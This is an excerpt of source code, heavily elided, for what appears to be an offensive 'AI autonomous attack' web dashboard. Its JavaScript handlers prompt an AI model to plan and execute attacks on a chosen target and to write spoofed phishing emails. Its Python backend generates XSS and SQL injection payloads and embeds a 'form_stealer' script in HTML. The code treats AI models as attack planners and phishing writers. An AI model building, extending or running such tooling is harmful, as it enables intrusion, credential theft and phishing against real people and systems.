...
<body>
    ...
    <script>
            ...
            .then(data => {
                ...
                if (typeof data.response === 'string') {
                    ...
                    if (data.response.response) {
                        ...
                        responseText = 'AI Error: ' + data.response.errors.join(', ');
                    } else {
        ...
        function startAIAutonomous(target) {
            addToResults(`[AI AUTONOMOUS] Starting AI-driven attack on ${target}...`);

            // Use AI to plan the attack
            fetch('/api/ai/chat', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    message: `Plan and execute a comprehensive attack on ${target}. Include reconnaissance, vulnerability assessment, and exploitation strategies.`
                })
            })
            .then(response => response.json())
            .then(data => {
                ...
                if (typeof data.response === 'string') {
                    ...
                    responseText = data.response.response || JSON.stringify(data.response, null, 2);
                }
                addToResults(`[AI PLAN] ${responseText}`);
                addToLogs(`[AI AUTONOMOUS] Attack plan generated for ${target}`);
            })
            .catch(error => addToResults(`[AI AUTONOMOUS] Failed: ${error.message}`));
        }
        ...
        function startWebAttack(target) {
            addToResults(`[WEB ATTACK] Starting comprehensive web attack on ${target}...`);
            ...
            .then(response => response.json())
            .then(data => {
                addToResults(`[RECON] ${JSON.stringify(data.results || data, null, 2)}`);
                addToLogs(`[RECON] Completed for ${target}`);
            })
            .catch(error => addToResults(`[RECON] Failed: ${error.message}`));

            // Then try payload injection
            ...
            .then(response => response.json())
            .then(data => {
                addToResults(`[PAYLOAD] XSS payload generated: ${data.payload || 'N/A'}`);
                addToTerminal(`Generated payload for ${target}`);
            })
            .catch(error => addToResults(`[PAYLOAD] Failed: ${error.message}`));
            ...
            .then(response => response.json())
            .then(data => {
                addToResults(`[BROWSER] Navigation initiated to ${target}`);
                addToTerminal(`Browser navigated to: ${target}`);
            })
            .catch(error => addToResults(`[BROWSER] Failed: ${error.message}`));
        }
        ...
        function startSocialEngineering(target) {
            addToResults(`[SOCIAL ENGINEERING] Starting social engineering attack on ${target}...`);

            // Use AI to generate social engineering content
            fetch('/api/ai/chat', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    message: `Generate a convincing phishing email targeting ${target}. Include subject line, sender spoofing, and persuasive content.`
                })
            })
            .then(response => response.json())
            .then(data => {
                ...
                addToResults(`[PHISHING] Generated email:\\n${responseText}`);
                addToLogs(`[SOCIAL ENGINEERING] Phishing content generated for ${target}`);
            })
            .catch(error => addToResults(`[SOCIAL ENGINEERING] Failed: ${error.message}`));
        }
    </script>
</body>
</html>
...
def api_status():
    data = {"backend": None}
    try:
        r = requests.get(f"{BACKEND_URL}/openclaw/redteam-skills", timeout=2)
...
def payload_generate():
    ...
    if payload_embedder:
        try:
            if payload_type == 'xss':
                # Create a simple XSS payload
                payload = f"<script>alert('XSS at {target}')</script>"
            elif payload_type == 'sql':
                # Create a simple SQL injection payload
                payload = f"' OR '1'='1' --"
            elif payload_type == 'js':
                # Use the embed_js_payload method
                html_template = "<html><body><h1>Loading...</h1></body></html>"
                payload = payload_embedder.embed_js_payload(html_template, 'form_stealer')
            else:
